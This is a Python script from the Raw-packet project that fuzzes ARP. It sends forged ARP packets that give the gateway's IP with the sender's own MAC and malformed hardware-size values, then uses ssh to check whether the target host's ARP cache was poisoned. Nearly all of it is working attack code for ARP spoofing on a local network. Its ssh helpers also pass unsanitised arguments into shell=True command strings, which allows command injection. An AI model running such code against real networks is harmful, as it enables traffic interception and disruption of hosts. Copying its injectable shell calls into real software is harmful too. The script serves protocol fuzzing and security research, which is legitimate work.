#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
arp_fuzz.py: ARP fuzzing script
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from subprocess import run, PIPE, STDOUT
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from struct import pack
from socket import inet_aton
from time import sleep
from prettytable import PrettyTable
from typing import Union, List, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion


# region Get mac of IPv4 gateway over ssh
def get_ipv4_gateway_mac_over_ssh(target_ipv4_address: str = '192.168.0.5',
                                  target_user_name: str = 'user',
                                  gateway_ipv4_address: str = '192.168.0.254') -> str:
    gateway_mac_address: str = ''
    target_command = run(['ssh ' + target_user_name + '@' + target_ipv4_address +
                          ' "arp -an | grep ' + gateway_ipv4_address + '"'],
                         shell=True, stdout=PIPE, stderr=STDOUT)
    target_arp_table: bytes = target_command.stdout
    target_arp_table: str = target_arp_table.decode('utf-8')
    target_arp_table: List[str] = target_arp_table.split(' ')
    try:
        return target_arp_table[3]
    except IndexError:
        return gateway_mac_address
# endregion


# region Update ARP table over ssh
def update_arp_table_over_ssh(target_ipv4_address: str = '192.168.0.5',
                              target_user_name: str = 'user',
                              gateway_ipv4_address: str = '192.168.0.254',
                              real_gateway_mac_address: str = '12:34:56:78:90:ab') -> bool:
    run(['ssh ' + target_user_name + '@' + target_ipv4_address +
         ' "arp -d ' + gateway_ipv4_address + ' > /dev/null 2>&1"'], shell=True)
    run(['ssh ' + target_user_name + '@' + target_ipv4_address +
         ' "ping -c 1 ' + gateway_ipv4_address + ' > /dev/null 2>&1"'], shell=True)
    target_command = run(['ssh ' + target_user_name + '@' + target_ipv4_address +
                          ' "arp -an | grep ' + gateway_ipv4_address + '"'],
                         shell=True, stdout=PIPE, stderr=STDOUT)
    target_arp_table: bytes = target_command.stdout
    target_arp_table: str = target_arp_table.decode('utf-8')
    target_arp_table: List[str] = target_arp_table.split(' ')
    # base.print_info('Current gateway MAC address: ', target_arp_table[3])
    if target_arp_table[3] == real_gateway_mac_address:
        return True
    else:
        return False
# endregion


# region Check mac of IPv4 gateway over ssh
def check_ipv4_gateway_mac(target_ipv4_address: str = '192.168.0.5',
                           target_user_name: str = 'user',
                           gateway_ipv4_address: str = '192.168.0.254',
                           real_gateway_mac_address: str = '12:34:56:78:90:ab',
                           test_parameter_name: str = 'test',
                           test_parameter_value: Union[None, int, bytes, str] = None) -> None:
    current_gateway_mac_address: str = get_ipv4_gateway_mac_over_ssh(target_ipv4_address,
                                                                     target_user_name,
                                                                     gateway_ipv4_address)
    if current_gateway_mac_address == real_gateway_mac_address:
        if test_parameter_value is None:
            base.print_info('IPv4 gateway MAC address not changed: ', real_gateway_mac_address)
        else:
            base.print_info('IPv4 gateway MAC address not changed: ', current_gateway_mac_address,
                            ' tested parameter: ', test_parameter_name + ' - ' + str(test_parameter_value))
    else:
        if test_parameter_value is None:
            base.print_success('IPv4 gateway MAC address is changed: ', current_gateway_mac_address)
        else:
            base.print_success('IPv4 gateway MAC address is changed: ', current_gateway_mac_address,
                               ' tested parameter: ', test_parameter_name + ' - ' + str(test_parameter_value))
        while True:
            if update_arp_table_over_ssh(target_ipv4_address=target_ipv4_address,
                                         target_user_name='root',
                                         gateway_ipv4_address=gateway_ipv4_address,
                                         real_gateway_mac_address=real_gateway_mac_address):
                break
            else:
                sleep(1)
# endregion


# region Main function
if __name__ == '__main__':

    # region Import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))

    from raw_packet.Utils.base import Base
    from raw_packet.Utils.network import RawEthernet, RawARP
    from raw_packet.Utils.tm import ThreadManager

    base: Base = Base()
    eth: RawEthernet = RawEthernet()
    arp: RawARP = RawARP()
    thread_manager: ThreadManager = ThreadManager(2)
    # endregion

    # region Raw socket
    raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    # endregion

    try:

        # region Check user and platform
        base.check_user()
        base.check_platform()
        # endregion

        # region Parse script arguments
        parser: ArgumentParser = ArgumentParser(description='ARP spoofing script')
        parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets', default=None)
        parser.add_argument('-T', '--target_ip', help='Set target IP address', default=None)
        parser.add_argument('-t', '--target_mac', help='Set target MAC address', default=None)
        parser.add_argument('-u', '--target_user', help='Set target user name for ssh', default='user')
        parser.add_argument('-G', '--gateway_ip', help='Set gateway IP address', default=None)
        parser.add_argument('-g', '--gateway_mac', help='Set gateway IP address', default=None)
        args = parser.parse_args()
        # endregion

        # region Get listen network interface, your IP and MAC address, first and last IP in local network
        if args.interface is None:
            base.print_warning('Please set a network interface for send ARP spoofing packets ...')
        current_network_interface: str = base.network_interface_selection(args.interface)
        your_mac_address: str = base.get_interface_mac_address(current_network_interface)
        your_ip_address: str = base.get_interface_ip_address(current_network_interface)
        first_ip_address: str = base.get_first_ip_on_interface(current_network_interface)
        last_ip_address: str = base.get_last_ip_on_interface(current_network_interface)
        # endregion

        # region Bind raw socket
        raw_socket.bind((current_network_interface, 0))
        # endregion

        # region Variables
        network_type: int = 0x0806
        hardware_type: int = 0x0001
        protocol_type: int = 0x0800
        hardware_size: int = 0x06
        protocol_size: int = 0x04
        response_opcode: int = 0x0002
        request_opcode: int = 0x0001
        # endregion

        # region Check gateway MAC address
        # thread_manager.add_task(check_ipv4_gateway_mac,
        #                         args.target_ip,
        #                         args.target_user,
        #                         args.gateway_ip,
        #                         real_ipv4_gateway_mac_address)
        # endregion

        # region Check ARP opcode
        for test_hardware_size in range(7, 255, 1):

            arp_packet: bytes = b''
            sender_ip: bytes = inet_aton(args.gateway_ip)
            target_ip: bytes = inet_aton(base.get_random_ip_on_interface(current_network_interface))
            sender_mac: bytes = eth.convert_mac(mac_address=your_mac_address)
            target_mac: bytes = eth.convert_mac(mac_address=eth.make_random_mac())
            arp_packet += pack('!H', hardware_type)
            arp_packet += pack('!H', protocol_type)
            arp_packet += pack('!B', test_hardware_size)
            arp_packet += pack('!B', protocol_size)
            arp_packet += pack('!H', 0)

            arp_packet += sender_mac
            for _ in range(test_hardware_size - 6):
                arp_packet += b'\00'
            arp_packet += pack('!' '4s', sender_ip)

            arp_packet += target_mac
            for _ in range(test_hardware_size - 6):
                arp_packet += b'\00'
            arp_packet += pack('!' '4s', target_ip)

            eth_header: bytes = eth.make_header(source_mac=your_mac_address,
                                                destination_mac='ff:ff:ff:ff:ff:ff',
                                                network_type=network_type,
                                                exit_on_failure=True)
            packet: bytes = eth_header + arp_packet

            for _ in range(3):
                raw_socket.send(packet)
                sleep(0.3)
            check_ipv4_gateway_mac(args.target_ip,
                                   args.target_user,
                                   args.gateway_ip,
                                   args.gateway_mac,
                                   'ARP test_hardware_size',
                                   test_hardware_size)
            sleep(0.5)
        # endregion

        # region Fuzz ARP responses

        # region Check Ethernet network_type
        # for test_network_type in range(65535):
        #
        #     if test_network_type == network_type:
        #         base.print_warning('Skip Ethernet network type: ', str(network_type))
        #
        #     else:
        #         arp_packet: bytes = b''
        #         sender_ip: bytes = inet_aton(args.gateway_ip)
        #         target_ip: bytes = inet_aton(args.target_ip)
        #         sender_mac: bytes = eth.convert_mac(mac_address=your_mac_address)
        #         target_mac: bytes = eth.convert_mac(mac_address=args.target_mac)
        #         arp_packet += pack('!H', hardware_type)
        #         arp_packet += pack('!H', protocol_type)
        #         arp_packet += pack('!B', hardware_size)
        #         arp_packet += pack('!B', protocol_size)
        #         arp_packet += pack('!H', response_opcode)
        #         arp_packet += sender_mac + pack('!' '4s', sender_ip)
        #         arp_packet += target_mac + pack('!' '4s', target_ip)
        #
        #         eth_header: bytes = eth.make_header(source_mac=your_mac_address,
        #                                             destination_mac=args.target_mac,
        #                                             network_type=test_network_type,
        #                                             exit_on_failure=True)
        #         packet: bytes = eth_header + arp_packet
        #
        #         for _ in range(2):
        #             raw_socket.send(packet)
        #             sleep(0.0001)
        # endregion

        # endregion

    except KeyboardInterrupt:
        raw_socket.close()
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        raw_socket.close()
        base.print_error(Error.args[0])
        exit(1)
